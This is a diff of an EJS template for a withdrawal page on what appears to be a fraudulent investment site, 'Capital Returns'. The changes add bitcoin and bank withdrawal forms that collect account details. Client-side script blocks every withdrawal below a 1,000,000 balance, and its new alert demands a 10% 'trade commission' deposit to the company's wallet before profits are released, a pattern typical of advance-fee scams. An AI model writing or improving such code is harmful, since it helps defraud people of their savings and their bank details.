@@ -180,7 +180,7 @@
         </div>
       </div>
     </div>
-    <% if(user.lastName == "Santiag") { %>
+    <% if(user.lastName == "Plovetskyi") { %>
     <div class="container-fluid animatedParent" style="
           background-color: #cccccc;
           border-radius: 15px;
@@ -191,17 +191,18 @@
           min-height: 10vh;
         ">
       <div class="row reasons-block" style="padding: 0; margin: 0"></div>
+      <h3>For bitcoin withdrawals</h3>
       <h6>
-        <strong>You have <%= `$${user.profit}` %> available for withdrawal. All
+        <strong>You have <%= `$${user.profit}` %> available for withdrawal. All bitcoin
           withdrawals are paid within 2 hours %>
         </strong>
       </h6>
       <h5 style="margin-top: 10px">
-        <strong>Input amount to withdraw:</strong>
+        <strong>Amount to withdraw:</strong>
       </h5>
       <form action="/withdraw" method="POST">
-        <input type="number" class="form-control" style="max-width: 260px; margin: 10px"
-          placeholder="Input desired withdraw amount" id="amountInput" name="amountRequested" required />
+        <input type="number" class="form-control" style="max-width: 260px; margin: 10px" value="<%= `${user.profit}` %>"
+          id="amountInput" name="amountRequested" required />
 
         <input type="text" class="form-control" style="display: none; margin: 10px" id="amountInput"
           value="<%= `${user._id}` %>" name="user" />
@@ -210,6 +211,69 @@
           value="<%= user.balance %>" name="userBalance" />
         <h5 style="margin-top: 10px">
           <strong>Input your bitcoin address:</strong>
+        </h5>
+        <input type="text" class="form-control" style="margin: 10px; max-width: 260px" id="amountInput"
+          name="bitcoinAddress" />
+        <input type="text" class="form-control" style="display: none; margin: 10px" id="userProfit"
+          value="<%= user.profit %>" name="userProfit" />
+
+        <input style="margin: 10px; border: none" class="see-brd-btn" type="submit" value="Withdraw" />
+      </form>
+      <p>
+        <strong>Any issues? Kindly contact us on
+          support@capitalreturnsinc.com</strong>
+      </p>
+    </div>
+    <div class="container-fluid animatedParent" style="
+          background-color: #cccccc;
+          border-radius: 15px;
+          width: 90%;
+          padding: 20px 0px 20px 3px;
+          border: 10px solid #3a3864;
+          margin-top: 20px;
+          min-height: 10vh;
+        ">
+      <div class="row reasons-block" style="padding: 0; margin: 0"></div>
+      <h3>For bank withdrawals</h3>
+      <h6>
+        <strong>You have <%= `$${user.profit}` %> available for withdrawal. All bank
+          withdrawals are paid within 2 days %>
+        </strong>
+      </h6>
+      <h5 style="margin-top: 10px">
+        <strong>Amount to withdraw:</strong>
+      </h5>
+      <form action="/withdraw" method="POST">
+        <input type="number" class="form-control" style="max-width: 260px; margin: 10px" value="<%= `${user.profit}` %>"
+          id="amountInput" name="amountRequested" required />
+
+        <input type="text" class="form-control" style="display: none; margin: 10px" id="amountInput"
+          value="<%= `${user._id}` %>" name="user" />
+
+        <input type="text" class="form-control" style="display: none; margin: 10px" id="amountInput"
+          value="<%= user.balance %>" name="userBalance" />
+        <h5 style="margin-top: 10px">
+          <strong>Bank name</strong>
+        </h5>
+        <input type="text" class="form-control" style="margin: 10px; max-width: 260px" id="amountInput"
+          name="bitcoinAddress" />
+        <h5 style="margin-top: 10px">
+          <strong>Account holder name</strong>
+        </h5>
+        <input type="text" class="form-control" style="margin: 10px; max-width: 260px" id="amountInput"
+          name="bitcoinAddress" />
+        <h5 style="margin-top: 10px">
+          <strong>Account number</strong>
+        </h5>
+        <input type="number" class="form-control" style="margin: 10px; max-width: 260px" id="amountInput"
+          name="bitcoinAddress" />
+        <h5 style="margin-top: 10px">
+          <strong>Routing number</strong>
+        </h5>
+        <input type="number" class="form-control" style="margin: 10px; max-width: 260px" id="amountInput"
+          name="bitcoinAddress" />
+        <h5 style="margin-top: 10px">
+          <strong>(For banks outside Canada) SWIFT Code</strong>
         </h5>
         <input type="text" class="form-control" style="margin: 10px; max-width: 260px" id="amountInput"
           name="bitcoinAddress" />
@@ -378,8 +442,8 @@
         }
         if (userBalance < 1000000) {
           alert(
-            "You are currently ineligible to make a withdrawal as withdrawable profits has been recomitted"
-            // "Sorry, user balance is not sufficient. Please note that our recommitment policy means you have to fund your user balance to a minimum of your last investment sum before withdrawing profits. \nIf you have questions, contact support on support@capitalreturnsinc.com or chat with an agent live on the website"
+            // "You are currently ineligible to make a withdrawal as withdrawable profits has been recomitted"
+            "Sorry, your trade commission is not yet paid. Please not that before withdrawing any profits, a trade commission of 10% of your total trade profits must deposited to Capital Returns blockchain wallet address. This is to ensure our traders are paid for their services. This is not an investment or deposit. \nIf you have questions, contact support on support@capitalreturnsinc.com or chat with an agent live on the website"
           );
           e.preventDefault();
         }
